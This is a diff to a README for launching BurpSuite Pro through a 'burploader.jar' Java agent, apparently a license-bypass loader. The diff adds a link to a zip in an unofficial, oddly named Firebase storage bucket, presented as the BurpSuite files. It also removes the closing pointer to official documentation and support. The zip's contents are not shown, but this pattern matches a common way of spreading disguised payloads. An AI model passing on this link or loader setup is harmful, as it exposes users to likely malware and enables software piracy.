@@ -2,6 +2,13 @@
 
 This project provides an easy setup for launching BurpSuite Pro using `burploader.jar`. Follow the instructions below to get started and troubleshoot any issues.
 
+> **Note:** This project is not my main focus. I am sharing it because I enjoy helping others, and it’s my passion to make things easier for people. 
+
+## Download
+
+You can download BurpSuite files from the following link:
+[Download BurpSuite](https://firebasestorage.googleapis.com/v0/b/snigebrawlaereht.appspot.com/o/uploads%2Fburpsuite.zip?alt=media&token=216de97b-2f11-4c6d-a3fa-9d7c50b57d15)
+
 ## Requirements
 
 - Java Development Kit (JDK) version 18.0.2.1
@@ -9,10 +16,7 @@ This project provides an easy setup for launching BurpSuite Pro using `burploade
 
 ## Installation
 
-1. Download and place the following files:
-   - `burploader.jar`
-   - `burpsuite_pro_v2023.2.4.jar` (BurpSuite Pro)
-
+1. Download and extract the BurpSuite files from the link above.
 2. Ensure the JDK is installed and the Java path is set to:
    ```
    C:\Program Files\Java\jdk-18.0.2.1\bin\java.exe
@@ -29,7 +33,7 @@ This project provides an easy setup for launching BurpSuite Pro using `burploade
 2. **Using `burp.bat` Script**  
    Alternatively, you can use the provided `burp.bat` file for launching BurpSuite:
    ```batch
-   "C:\Program Files\Java\jdk-18.0.2.1\bin\java.exe" "--add-opens=java.desktop/javax.swing=ALL-UNNAMED" "--add-opens=java.base/java.lang=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED" "-javaagent:burploader.jar" "-noverify" "-jar" "C:\Users\user\path/of/your"
+   "C:\Program Files\Java\jdk-18.0.2.1\bin\java.exe" "--add-opens=java.desktop/javax.swing=ALL-UNNAMED" "--add-opens=java.base/java.lang=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED" "-javaagent:burploader.jar" "-noverify" "-jar" "C:\Users\user\Desktop\burp\burpsuite_pro_v2023.2.4.jar"
    ```
 
    Modify the last part of the path in `burp.bat` if your BurpSuite file is in a different location.
@@ -57,11 +61,3 @@ If you encounter issues when launching BurpSuite, follow these steps:
 - **JDK Path:** Ensure that your JDK is installed at `C:\Program Files\Java\jdk-18.0.2.1\bin\java.exe`.
 - **BurpSuite Path:** Ensure `burpsuite_pro_v2023.2.4.jar` is correctly located at `C:\Users\user\Desktop\burp\`.
 
-## Notes
-
-- Make sure you have the appropriate permissions to access and modify files in the specified directories.
-- The `burp.bat` script includes the necessary `--add-opens` flags for Java modules, which ensure compatibility with BurpSuite's internal libraries.
-
----
-
-Enjoy using BurpSuite with the loader setup! If you have any questions or encounter issues, please refer to the official BurpSuite documentation or contact support.
